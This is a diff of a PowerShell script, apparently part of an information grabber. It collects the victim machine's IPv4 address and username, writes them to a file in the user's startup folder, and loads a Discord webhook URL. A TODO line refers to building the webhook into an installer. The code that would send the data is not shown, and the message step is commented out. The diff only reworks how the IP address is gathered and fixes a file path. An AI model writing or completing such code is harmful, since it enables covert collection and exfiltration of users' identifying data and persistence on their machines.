@@ -2,23 +2,14 @@
 # TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
 
 # Get IPv4 address of the machine
-$IPAddressString = "IPv4 Address"
-# Use Get-NetAdapter to get network adapter information
-$NetworkAdapter = Get-NetAdapter |
-    Where-Object { $_.Status -eq "Up" -and $_.PhysicalMediaType -eq "802.3 Ethernet" } |
-    Select-Object -First 1
+$ipAddressString = "IPv4 Address"
+# Uncomment the following line when using older versions of Windows without IPv6 support
+# $ipAddressString = "IP Address"
+$ipconfigOutput = ipconfig
+$IPAddress = $ipconfigOutput | Select-String -Pattern $ipAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
 
-if ($NetworkAdapter -eq $null) {
-    Write-Host "No active Ethernet adapter found."
-} else {
-    $NetworkInterfaceName = $NetworkAdapter.Name
-    $IPAddress = (Get-NetIPAddress -InterfaceAlias $NetworkInterfaceName | Where-Object { $_.AddressFamily -eq "IPv4" }).IPAddress
-}
-
-if ($IPAddress -eq $null) {
-    # If no IP address is found, fall back to using ipconfig
-    $IPAddress = ipconfig | Select-String -Pattern $IPAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
-}
+# Get the current user's username
+$Username = $env:USERNAME
 
 # Get the user's profile folder
 $UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
@@ -31,7 +22,7 @@ $DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile
 
 # Create a text file in the user's startup folder
 $TextContent = "$IPAddress`n$Username"
-$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory$Username.icu"
+$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
 $TextContent | Out-File -FilePath $TextFile
 
 # Define a message (commented out for now)
